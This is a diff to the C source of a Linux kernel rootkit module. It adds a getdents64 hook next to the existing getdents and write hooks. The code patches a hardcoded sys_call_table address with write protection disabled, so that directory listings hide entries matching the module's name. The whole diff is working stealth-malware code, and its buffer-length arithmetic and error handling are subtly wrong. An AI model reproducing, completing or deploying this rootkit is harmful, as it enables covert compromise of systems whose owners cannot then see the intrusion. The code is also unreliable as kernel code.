@@ -18,8 +18,12 @@ unsigned long* syscall_table = (unsigned long*)0xffffffff816001e0;
 asmlinkage long (*original_write)(unsigned int,
                                   const char __user *,
                                   size_t);
-asmlinkage long (*original_getdents)(unsigned int,
+asmlinkage long (*original_getdents64)(unsigned int,
                                 struct linux_dirent64 __user *,
+                                unsigned int);
+
+asmlinkage long (*original_getdents)(unsigned int,
+                                struct linux_dirent __user *,
                                 unsigned int);
 
 asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
@@ -29,41 +33,81 @@ asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
 }
 
 /*
- * Overriding getdents function
- * Arguments :
+ * Overriding getdents64 function
+ * Arguments :
  * fd = file descriptor, reffering the directory
  * dirp = buffer for linux_dirent structure
  * count = size of the buffer
  */
-asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
-{
-    unsigned int tmp, i;
-    struct linux_dirent64 __user *new_dir;
+ asmlinkage long custom_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
+ {
+     unsigned int tmp, i;
+     struct linux_dirent64 __user *new_dir;
 
-    tmp = (*original_getdents)(fd, dirp, count);
-    new_dir = (struct linux_dirent64 __user *) kmalloc(tmp, GFP_KERNEL);
-    memcpy(new_dir, dirp, tmp);
-    //char hide[] = "ker_mod";
-    i = 0;
-    printk(KERN_ALERT "test: %u\n", count);
-    while (i < count) {
-        if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
-            printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
-            int reclen = new_dir->d_reclen;
-            char* next_rec = (char *)new_dir + reclen;
-            printk(KERN_ALERT "test new_dir: %s\n", next_rec);
-            int len = (int)dirp + tmp - (int)next_rec;
-            memmove(new_dir, next_rec, len);
-            printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
-            tmp -= reclen;
-            continue;
-        }
-        i += new_dir->d_reclen-1;
-        new_dir = (struct linux_dirent64*)((char *)dirp + new_dir->d_reclen-1);
-        printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
-    }
-    return tmp;
-}
+     tmp = (*original_getdents64)(fd, dirp, count);
+     i = 0;
+     new_dir = dirp;
+     while (i < tmp) {
+         int reclen, len;
+         char* next_rec;
+         char* remaining_dirents;
+         if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
+             // printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
+             reclen = new_dir->d_reclen;
+             next_rec = (char *)new_dir + reclen;
+             // printk(KERN_ALERT "test new_dir: %s\n", next_rec);
+             len = (int *)dirp + tmp - (int *)next_rec;
+             remaining_dirents = kmalloc(len, GFP_KERNEL);
+             if(copy_from_user(remaining_dirents, next_rec, len))
+                 continue;
+             if(copy_to_user(new_dir, remaining_dirents, len))
+                 continue;
+             // printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
+             kfree(remaining_dirents);
+             tmp -= reclen;
+             continue;
+         }
+         i += new_dir->d_reclen;
+         new_dir = (struct linux_dirent64*)((char *)dirp + i);
+         // printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
+     }
+     return tmp;
+ }
+
+ asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
+ {
+     unsigned int tmp, i;
+     struct linux_dirent __user *new_dir;
+
+     tmp = (*original_getdents)(fd, dirp, count);
+     i = 0;
+     new_dir = dirp;
+     while (i < tmp) {
+         int reclen, len;
+         char* next_rec;
+         char* remaining_dirents;
+         if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
+             // printk(KERN_ALERT "test 1. %s\n", new_dir->d_name);
+             reclen = new_dir->d_reclen;
+             next_rec = (char *)new_dir + reclen;
+             // printk(KERN_ALERT "test new_dir: %s\n", next_rec);
+             len = (int *)dirp + tmp - (int *)next_rec;
+             remaining_dirents = kmalloc(len, GFP_KERNEL);
+             if(copy_from_user(remaining_dirents, next_rec, len))
+                 continue;
+             if(copy_to_user(new_dir, remaining_dirents, len))
+                 continue;
+             // printk(KERN_ALERT "test 2. %s\n", new_dir->d_name);
+             kfree(remaining_dirents);
+             tmp -= reclen;
+             continue;
+         }
+         i += new_dir->d_reclen;
+         new_dir = (struct linux_dirent*)((char *)dirp + i);
+         // printk(KERN_ALERT "test next: %s\n", new_dir->d_name);
+     }
+     return tmp;
+ }
 
 void module_hide(void)
 {
@@ -160,10 +204,12 @@ static int __init rootkit_init(void)
 				procfs_clean();
 				return 1;
 		}
+    original_getdents64 = (void*)syscall_table[__NR_getdents64];
     original_getdents = (void*)syscall_table[__NR_getdents];
     original_write = (void*)syscall_table[__NR_write];
     /* Making sys_call_table read/write */
     GPF_DISABLE();
+    syscall_table[__NR_getdents64] = (long)custom_getdents64;
     syscall_table[__NR_getdents] = (long)custom_getdents;
     syscall_table[__NR_write] = (long)custom_write;
     /* sys_call_table back to read-only */
@@ -182,6 +228,7 @@ static void __exit rootkit_exit(void)
     GPF_DISABLE();
     syscall_table[__NR_write] = (long)original_write;
     syscall_table[__NR_getdents] = (long)original_getdents;
+    syscall_table[__NR_getdents64] = (long)original_getdents64;
     /* sys_call_table back to read-only */
     GPF_ENABLE();
 		printk(KERN_INFO "Closing rootkit\n");
